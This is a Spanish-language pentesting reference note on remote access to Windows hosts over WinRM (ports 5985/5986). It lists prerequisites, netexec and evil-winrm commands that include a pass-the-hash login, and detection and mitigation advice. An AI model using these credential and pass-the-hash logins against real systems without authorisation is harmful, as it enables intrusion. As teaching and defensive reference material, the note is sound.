---
title: Conectarse por WinRM
resumen: Sesión de PowerShell remota completa, por los puertos 5985/5986.
tags: evil-winrm, netexec
---

## Definición

Conexión por **WinRM** (*Windows Remote Management*, puertos 5985 HTTP / 5986 HTTPS): da una sesión de **PowerShell remota interactiva**, con todo lo que eso implica — acceso a cmdlets, módulos y al sistema de archivos remoto, sin la sobrecarga gráfica de RDP. Habilitado por defecto desde **Windows Server 2012**.

## Cuándo se usa

Con credenciales válidas (usuario/contraseña o hash NTLM) de una cuenta que pertenezca al grupo **Remote Management Users** o a Administradores del equipo objetivo. Es habitualmente la vía preferida frente a [[conectarse-como-system|psexec]]/[[conectarse-por-rpc|wmiexec]] cuando se necesita trabajar un rato en la máquina (varios comandos, subir/bajar archivos), porque da una consola persistente en vez de ejecuciones puntuales.

## Requisitos previos

- Usuario válido (contraseña o hash NTLM) con permisos de administración remota sobre el equipo.
- Puerto 5985 (o 5986 si va por TLS) accesible.

## Desarrollo del ataque

1. Confirmar que el servicio WinRM responde en el objetivo.
2. Conectarse con `evil-winrm` usando contraseña o, si solo se dispone del hash NTLM, con Pass the Hash.

```bash
# Comprobación rápida del servicio
netexec winrm 10.10.10.10 -u "usuario" -p "password"
```

```bash
# Login con usuario y contraseña
evil-winrm -u usuario -p contraseña -i IP

# Login por Pass the Hash (NTLM/NT hash)
evil-winrm -u '' -p 'HASH NTLM' -i IP
```

## Herramientas relacionadas

- Ver [[evil-winrm]]
- Ver [[netexec]] (comprobación del servicio)

## Detección y mitigación

Restringir la pertenencia a Remote Management Users, forzar WinRM sobre HTTPS con certificado válido en vez de HTTP en claro, y monitorizar conexiones WinRM (evento 4624 tipo 3 sobre el puerto 5985/5986) desde orígenes que no correspondan a herramientas de administración habituales.
